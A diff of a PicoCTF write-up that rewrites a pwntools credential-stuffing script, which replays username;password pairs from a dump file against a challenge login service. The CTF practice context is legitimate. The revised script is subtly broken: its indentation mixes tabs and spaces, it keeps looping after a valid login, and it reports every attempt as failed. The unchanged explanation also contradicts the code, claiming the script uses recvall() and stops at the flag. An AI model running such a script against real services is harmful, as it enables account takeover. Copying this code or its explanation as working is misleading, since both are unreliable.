@@ -1,13 +1,13 @@
-# PicoCTF — Credential Brute Force (TCP Login)
+# PicoCTF — Credential Stuffing
 
 ## Challenge Overview
 
 | Field           | Details                                      |
 |----------------|----------------------------------------------|
 | **Platform**   | PicoCTF                                      |
-| **Category**   | General Skills / Scripting                   |
+| **Category**   | Web Exploitation                             |
 | **Tools Used** | Python, pwntools                             |
-| **Difficulty** | Beginner–Intermediate                        |
+| **Difficulty** | Medium                                       |
 
 ---
 
@@ -52,45 +52,30 @@ Each line was split on the `;` delimiter to extract the username and password.
 ```python
 from pwn import *
 
-# Load credentials from file
-with open("credentials.txt", "r") as f:
-    creds = f.read().splitlines()
-
-host = "<target-host>"
-port = <target-port>
+with open("creds-dump.txt", "r") as f:
+	creds = f.readlines()
 
 for line in creds:
-    username, password = line.split(";")
+	try:
+		username, password = line.split(";")
+		target = remote("crystal-peak.picoctf.net", 51188)
+		target.recvuntil(b"Username")
+		target.sendline(username.encode())
+		
+		target.recvuntil(b"Password")
+		target.sendline(password.encode())
+		
+		response = target.recvrepeat().decode()
+		
+		if "Invalid username or password" not in response:
+			print(f"Valid cred = {username}::{password}")
+			print(response)
+			target.close()
+		print(f"failed username {username} : {password}")
 
-    try:
-        # Open a fresh TCP connection for every attempt
-        conn = remote(host, port, timeout=5)
-
-        # Wait for the username prompt and send username
-        conn.recvuntil(b"username")
-        conn.sendline(username.encode())
-
-        # Wait for the password prompt and send password
-        conn.recvuntil(b"password")
-        conn.sendline(password.encode())
-
-        # Read the server's response
-        response = conn.recvall(timeout=3).decode(errors="ignore")
-
-        # Check if the flag is in the response
-        if "picoCTF{" in response:
-            print(f"[+] Found valid credentials!")
-            print(f"    Username : {username}")
-            print(f"    Password : {password}")
-            print(f"    Flag     : {response}")
-            conn.close()
-            break
-
-        conn.close()
-
-    except Exception as e:
-        print(f"[-] Error with {username}:{password} — {e}")
-        continue
+	except Exception as e:
+        	print(f"Error: {e}")
+       
 ```
 
 ### How It Works
@@ -100,7 +85,7 @@ for line in creds:
 3. **Opens a new TCP connection** for each login attempt using `remote()` — this is necessary because most CTF services drop the connection after a failed login.
 4. **Waits for the prompt** using `recvuntil()` before sending each value — this keeps communication synchronized with the server.
 5. **Sends credentials** using `sendline()` which appends a newline, simulating pressing Enter.
-6. **Reads the server's full response** with `recvall()` and checks if it contains the flag pattern `picoCTF{`.
+6. **Reads the server's full response** with `recvall()`.
 7. **Stops and prints** the flag once a match is found.
 
 ---
@@ -112,8 +97,7 @@ for line in creds:
 | `remote(host, port)` | Establishes a raw TCP connection to the target           |
 | `recvuntil(b"...")` | Receives data until a specific byte string is found       |
 | `sendline(data)` | Sends data followed by a newline character (`\n`)           |
-| `recvall()`      | Receives all remaining data from the connection             |
-| `conn.close()`   | Cleanly closes the TCP connection                           |
+| `recvrepeat()`      | Receives all response from the connection             |
 
 ---
 
